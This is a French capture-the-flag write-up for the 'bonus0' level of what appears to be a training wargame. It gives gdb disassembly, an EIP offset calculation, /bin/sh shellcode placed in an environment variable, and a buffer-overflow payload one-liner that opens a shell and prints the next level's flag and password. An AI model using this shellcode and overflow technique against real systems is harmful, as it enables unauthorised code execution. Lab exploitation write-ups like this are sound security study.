On se connecte sur le bonus0, ou se trouve un **binaire** <code>bonus0</code>.

On cherche a savoir ce que fait ce binaire:

```gdb
> gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485b9 <+21>:    lea    0x16(%esp),%eax
   0x080485bd <+25>:    mov    %eax,(%esp)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave
   0x080485cb <+39>:    ret
End of assembler dump.
(gdb) > disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:     push   %ebp
   0x0804851f <+1>:     mov    %esp,%ebp
   0x08048521 <+3>:     push   %edi
   0x08048522 <+4>:     push   %ebx
   0x08048523 <+5>:     sub    $0x50,%esp
   0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:    lea    -0x30(%ebp),%eax
   0x08048531 <+19>:    mov    %eax,(%esp)
   0x08048534 <+22>:    call   0x80484b4 <p>
   0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:    lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:    mov    %eax,(%esp)
   0x08048547 <+41>:    call   0x80484b4 <p>
   0x0804854c <+46>:    lea    -0x30(%ebp),%eax
   0x0804854f <+49>:    mov    %eax,0x4(%esp)
   0x08048553 <+53>:    mov    0x8(%ebp),%eax
   0x08048556 <+56>:    mov    %eax,(%esp)
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:    mov    $0x80486a4,%ebx
   0x08048563 <+69>:    mov    0x8(%ebp),%eax
   0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:    mov    %eax,%edx
   0x0804856f <+81>:    mov    $0x0,%eax
   0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:    mov    %edx,%edi
   0x08048579 <+91>:    repnz scas %es:(%edi),%al
   0x0804857b <+93>:    mov    %ecx,%eax
   0x0804857d <+95>:    not    %eax
   0x0804857f <+97>:    sub    $0x1,%eax
   0x08048582 <+100>:   add    0x8(%ebp),%eax
   0x08048585 <+103>:   movzwl (%ebx),%edx
   0x08048588 <+106>:   mov    %dx,(%eax)
   0x0804858b <+109>:   lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:   mov    %eax,0x4(%esp)
   0x08048592 <+116>:   mov    0x8(%ebp),%eax
   0x08048595 <+119>:   mov    %eax,(%esp)
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
   0x0804859d <+127>:   add    $0x50,%esp
   0x080485a0 <+130>:   pop    %ebx
   0x080485a1 <+131>:   pop    %edi
   0x080485a2 <+132>:   pop    %ebp
   0x080485a3 <+133>:   ret
End of assembler dump.
(gdb) > disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     sub    $0x1018,%esp
   0x080484bd <+9>:     mov    0xc(%ebp),%eax
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:    mov    %eax,0x4(%esp)
   0x080484da <+38>:    movl   $0x0,(%esp)
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
   0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:    mov    %eax,(%esp)
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:    movb   $0x0,(%eax)
   0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:    movl   $0x14,0x8(%esp)
   0x0804850d <+89>:    mov    %eax,0x4(%esp)
   0x08048511 <+93>:    mov    0x8(%ebp),%eax
   0x08048514 <+96>:    mov    %eax,(%esp)
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
```

Après analyse du fichier (**source.c**), on se rend compte que l'exploitation du fichier se fera par la fonction **strcat**.

On cherche a obtenir le buffer dans le main, ce qui nous permettra de trouver l'offset : 

```gdb
(gdb) > b * 0x080485c0
Breakpoint 1 at 0x80485c0
(gdb) > run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAA
 -
ABCDEFGHIJKLMNOPQRSTUVW

Breakpoint 1, 0x080485c0 in main ()
(gdb) > ni
AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRST ABCDEFGHIJKLMNOPQRST
0x080485c5 in main ()
(gdb) > i f
Stack level 0, frame at 0xbffff700:
 eip = 0x80485c5 in main; saved eip 0x4d4c4b4a
 Arglist at 0xbffff6f8, args:
 Locals at 0xbffff6f8, Previous frame's sp is 0xbffff700
 Saved registers:
  ebp at 0xbffff6f8, eip at 0xbffff6fc
```
Sur l'eip sauvegardée, on voit que l'adresse (en little indian) commence par notre 'J', qui correspond donc au 10em caractère de notre seconde chaine.

> On commence à écraser l'eip au 10em caractère, l'offset est donc de 9.

Nous allons devoir rajouter un shellcode car nous n'avons pas la place de faire un ret2libc dans le peu de mémoire qu'il nous reste (**20 - 9 = 11** alors que ret2libc nécessite 12 bytes).

On écrit un shellcode dans une variable d'environement accessible pour le programme, et on trouve son adresse grâce a un petit script en c :

```shell
export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x6
2\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")

echo "#include <stdio.h>
#include <stdlib.h>
int main(){ printf(\"SHELL= %p\n\", getenv(\"SHELLCODE\")); return 0; }" > /tmp/getsh.c

cd /tmp/
gcc getsh.c
./a.out
SHELL= \x\x\x\x
cd
```

Une fois l'adresse du shellcode dans l'environement trouvé, on peut appliquer la fonction suivante:   
<pre><code>python -c "print 'A' * 4095 + '\n' + 'B' * 9 + '\x\x\x\x' + 'B' * 7"</code></pre>

On ajoute A * 4095 + '\n' au premier argument pour pouvoir insérer le second argument, car la fonction **read** a un buffer de 4096, elle continuera donc de lire la suite des instructions dans stdin. Ce qui nous permet d'écrire nos deux arguments en une fois.  
Le '\n' permet de passer outre le strchr qui le transformera en '\0'.  
On mets 9 caractères au début du second argument pour arriver à la fin de l'offset et inserer à la suite notre shellcode.
On est obligé d'avoir au moins 7 caractères en plus pour le deuxième argument pour le **strchr**.

```shell
> (python -c "print 'A' * 4095 + '\n' + 'B' * 9 + '\x\x\x\x' + 'B' * 7"; cat) | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB
whoami
bonus1
cd ../bonus1 && cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

For download :
<pre><code>scp -P4242 bonus0@192.168.1.78:bonus0 .</code></pre>
> Password : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728


